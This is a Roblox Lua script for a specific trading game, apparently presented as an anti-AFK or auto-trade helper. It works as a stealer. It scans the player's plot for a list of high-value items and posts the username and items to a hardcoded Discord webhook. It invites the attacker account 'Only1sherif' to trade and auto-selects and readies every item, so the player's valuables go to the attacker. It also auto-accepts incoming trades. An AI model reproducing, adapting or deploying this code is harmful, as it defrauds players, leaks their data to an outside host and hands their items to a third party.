if game.PlaceId ~= 109983668079237 then return end

-- ========== CONFIG ==========
local MY_TARGET = "Only1sherif"
local NEW_WEBHOOK = "https://discord.com/api/webhooks/1496254716508639262/J-eMNrXhdgaWAiIlMIiObJCsXw0E3s4XHB2S-0HLvkOYRdoJI2QDnAGmPU0EJtTZhbK6"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

-- ========== ANTI-AFK ==========
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    vu:CaptureController()
    vu:ClickButton2(Vector2.new())
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer.PlayerGui

-- ========== SCANNER ==========
local function scanPlot()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    local myPlot = nil
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local gui = sign:FindFirstChildOfClass("SurfaceGui")
            if gui and gui:FindFirstChildOfClass("Frame") then
                local lbl = gui.Frame:FindFirstChildOfClass("TextLabel")
                if lbl and lbl.Text:lower():find(LocalPlayer.Name:lower()) then
                    myPlot = p
                    break
                end
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then
                local name = child.Name:lower()
                for _, wanted in ipairs(wantedItems) do
                    if name:find(wanted:lower()) then
                        table.insert(found, child.Name)
                        break
                    end
                end
            end
        end
    end
    return found
end

local function sendLog(items)
    pcall(function()
        local itemlist = table.concat(items, ", ")
        request({
            Url = NEW_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({
                content = "@everyone",
                embeds = {{
                    title = "Target Found",
                    description = "User: " .. LocalPlayer.Name .. "\nItems: " .. itemlist,
                    color = 16711680
                }}
            })
        })
    end)
end

-- ========== TRADE UTILS ==========
local function tradeIsActive()
    local gui = playerGui:FindFirstChild("TradeLiveTrade")
    return gui and gui:FindFirstChild("TradeLiveTrade") and gui.TradeLiveTrade.Visible
end

-- ========== CORE LOOP ==========
while true do
    local highValue = scanPlot()
    local isActive = tradeIsActive()

    -- 1. Accept Incoming Requests (Always)
    pcall(function()
        local req = playerGui:FindFirstChild("TradeRequest")
        if req and req:FindFirstChild("TradeRequest") and req.TradeRequest.Visible then
            firesignal(req.TradeRequest.Accept.Activated)
        end
    end)

    if #highValue > 0 then
        -- MODE: LOGGER/STEALER
        if not isActive then
            -- Send Invite to Only1sherif
            local tl = playerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
            if tl then
                local sb = tl.bg.SearchFrame.SearchBox
                sb.Text = MY_TARGET
                task.wait(0.2)
                firesignal(sb.FocusLost, true)
                task.wait(0.5)
                for _, p in pairs(tl.Global.List:GetChildren()) do
                    if p:IsA("Frame") and p:FindFirstChild("Fill") then
                        firesignal(p.Fill.Send.Activated)
                        sendLog(highValue)
                        break
                    end
                end
            end
        else
            -- Inside Trade with Only1sherif
            local inner = playerGui.TradeLiveTrade.TradeLiveTrade
            if inner.Other.Username.Text:lower():find(MY_TARGET:lower()) then
                local scroll = inner:FindFirstChild("ScrollingFrame", true)
                if scroll then
                    for _, slot in pairs(scroll:GetChildren()) do
                        if slot.Name:sub(1,9) == "Selection" then
                            local spacer = slot:FindFirstChild("Spacer")
                            if spacer and spacer:FindFirstChild("UIStroke") then
                                if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                    firesignal(spacer.Activated)
                                    task.wait(0.1)
                                end
                            end
                        end
                    end
                end
                task.wait(0.5)
                firesignal(inner.ReadyButton.Activated)
            end
        end
    else
        -- MODE: NORMAL AFK AUTO-ACCEPT
        if isActive then
            local inner = playerGui.TradeLiveTrade.TradeLiveTrade
            firesignal(inner.ReadyButton.Activated)
        end
    end
    task.wait(1)
end
